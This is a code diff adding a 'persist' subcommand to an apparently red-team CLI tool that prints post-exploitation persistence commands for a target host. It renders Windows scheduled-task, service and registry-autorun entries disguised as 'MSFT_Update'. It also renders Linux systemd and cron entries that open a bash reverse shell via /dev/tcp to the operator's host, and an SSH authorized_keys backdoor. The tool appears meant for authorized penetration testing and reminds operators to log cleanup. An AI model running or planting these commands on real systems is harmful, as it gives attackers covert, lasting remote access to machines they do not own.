@@ -2639,6 +2639,71 @@ def cmd_retest(args, store):
 
 
 @needs_engagement
+def cmd_persist(args, store):
+    """Print persistence one-liners per platform + technique.
+    Same rationale as `pivot` — every persistence primitive
+    is a per-target action + noisy artifact fieldkit shouldn't
+    fire blindly. Operator picks the technique + runs the
+    command themselves, then records what they did via
+    `fieldkit prep` / manual cleanup manifest so it's revert-
+    able post-eng.
+    """
+    from . import config as config_mod
+    cfg = config_mod.load(store)
+    lhost = cfg.get("lhost") or "<your-lhost>"
+    lport = cfg.get("lport") or 443
+    if not args.host:
+        host = "<foothold>"
+    else:
+        host_row = store.host_by_ip(args.host)
+        if host_row is None:
+            _err(f"{args.host!r} is not in the engagement")
+            return 2
+        host = host_row["ip"]
+    plat = args.platform
+    print(f"persistence options for {host} ({plat}):\n")
+    if plat in ("windows", "both"):
+        print("=== Windows: scheduled task (SYSTEM if run as admin) ===")
+        print("  schtasks /Create /TN 'MSFT_Update' /TR "
+              f"'C:\\Windows\\Temp\\payload.exe' /SC ONSTART /RU SYSTEM /F")
+        print("=== Windows: service (SYSTEM, persistent across reboot) ===")
+        print("  sc.exe create MSFT_Update binPath= 'C:\\Windows\\Temp\\payload.exe'")
+        print("  sc.exe config MSFT_Update start= auto")
+        print("=== Windows: registry autorun (user-context) ===")
+        print("  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
+              "/v MSFT_Update /t REG_SZ /d 'C:\\Windows\\Temp\\payload.exe' /f")
+        print("=== Windows: WMI event subscription (SYSTEM, filterless) ===")
+        print("  # see impacket-wmiexec-persist or SharpWMI for the full "
+              "__EventFilter+__EventConsumer+__FilterToConsumerBinding shape")
+        print()
+    if plat in ("linux", "both"):
+        print("=== Linux: systemd user unit (per-user, no root) ===")
+        print("  mkdir -p ~/.config/systemd/user")
+        print("  cat > ~/.config/systemd/user/msft-update.service <<EOF")
+        print("  [Unit]")
+        print("  Description=Update daemon")
+        print("  [Service]")
+        print(f"  ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
+        print("  Restart=always")
+        print("  [Install]")
+        print("  WantedBy=default.target")
+        print("  EOF")
+        print("  systemctl --user daemon-reload && systemctl --user enable --now msft-update")
+        print("=== Linux: cron (root or user) ===")
+        print(f"  (crontab -l 2>/dev/null; echo '@reboot /bin/bash -c "
+              f"\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"') | crontab -")
+        print("=== Linux: SSH authorized_keys ===")
+        print("  # generate a key locally, echo the pub into the target's ~/.ssh/authorized_keys")
+        print("  mkdir -p ~/.ssh && chmod 700 ~/.ssh")
+        print("  echo 'ssh-ed25519 AAAA... operator' >> ~/.ssh/authorized_keys")
+        print()
+    print("REMINDER: every technique above leaves a persistent "
+          "artifact — record it in the engagement's cleanup manifest "
+          "(`fieldkit report --cleanup`) so it's revertable post-eng.")
+    return 0
+
+
+@needs_engagement
 def cmd_pivot(args, store):
     """Emit the exact command shapes for common pivot
     patterns from an owned host — SSH SOCKS, chisel client,
@@ -5014,6 +5079,24 @@ the spec is missing that field. `--from-file` reads one credential per line.
     p_pivot.add_argument("--socks-port", type=int, default=1080,
                           help="SOCKS proxy port (default: 1080)")
     p_pivot.set_defaults(func=cmd_pivot)
+
+    p_persist = sub.add_parser(
+        "persist",
+        help="print long-term persistence one-liners per platform",
+        description="Print-only surface — same rationale as pivot. "
+                    "Every persistence primitive is a per-target "
+                    "action + noisy artifact fieldkit shouldn't fire "
+                    "blindly. Renders scheduled-task/service/"
+                    "autorun/systemd/cron/SSH-key one-liners for the "
+                    "operator to pick + run. Reminds to record each "
+                    "in the cleanup manifest.")
+    p_persist.add_argument("--host", metavar="IP",
+                            help="target foothold host (default: placeholder)")
+    p_persist.add_argument("--platform", choices=("windows", "linux", "both"),
+                            default="both",
+                            help="which platform's techniques to render "
+                                 "(default: both)")
+    p_persist.set_defaults(func=cmd_persist)
 
     p_refresh = sub.add_parser(
         "refresh",
